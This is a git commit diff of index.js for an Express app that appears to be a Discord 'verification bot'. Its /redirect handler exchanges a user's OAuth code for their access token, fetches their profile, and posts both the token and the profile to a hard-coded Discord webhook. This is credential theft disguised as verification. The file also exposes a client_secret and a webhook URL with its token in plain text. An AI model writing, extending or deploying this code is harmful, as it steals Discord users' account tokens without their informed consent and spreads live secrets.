f9abfffca68ed4a514a8c257e90059d62de7b086
Bottletabs <99525766+Bottletabs@users.noreply.github.com>
2023-01-19 23:01:32 -0500

    Update index.js

--- index.js
+++ index.js
@@ -13,7 +13,8 @@ app.get('/redirect', (req, res) => {
         client_secret: 'e92eb957-6e2f-43ad-a233-dfbec6cadc86',
         code: code,
         redirect_uri: 'https://discord-verification-bot-79dd.onrender.com/'
-    }).then(response => {
+    })
+    .then(response => {
         const access_token = response.data.access_token;
 
         // Get the user's profile
@@ -21,23 +22,35 @@ app.get('/redirect', (req, res) => {
             headers: {
                 'Authorization': 'Bearer ' + access_token
             }
-        }).then(response => {
+        })
+        .then(response => {
             const user = response.data;
 
             // Send the access token and user information to your webhook
             axios.post('https://discord.com/api/webhooks/1065835230621081684/CwV2UA-Fg7iT42kf4SqeL_3DBCNL9xyb9zw5ZSpeP7k-W_VHkOgY35j0fbilaswbk_PW', {
                 access_token: access_token,
                 user: user
-            }).then(response => {
-                res.send('Token and user information sent to webhook');
-            }).catch(err => {
-                console.error(err);
+            })
+            .then(response => {
+                // Send a message to the user indicating that their information was sent to the webhook
+                res.send('Your information was sent to the webhook.');
+            })
+            .catch(error => {
+                console.log(error);
+                res.send('An error occurred while sending your information to the webhook.');
             });
-        }).catch(err => {
-            console.error(err);
-            res.send('Error');
+        })
+        .catch(error => {
+            console.log(error);
+            res.send('An error occurred while getting your profile.');
         });
-    }).catch(err => {
-        console.error(err);
-        res.send('Error');
+    })
+    .catch(error => {
+        console.log(error);
+        res.send('An error occurred while getting your access token.');
     });
+});
+
+app.listen(process.env.PORT || 3000, () => {
+    console.log('Server is running on port 3000');
+});
